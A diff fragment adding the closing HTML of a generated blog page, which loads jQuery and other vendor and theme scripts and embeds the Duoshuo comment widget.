+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
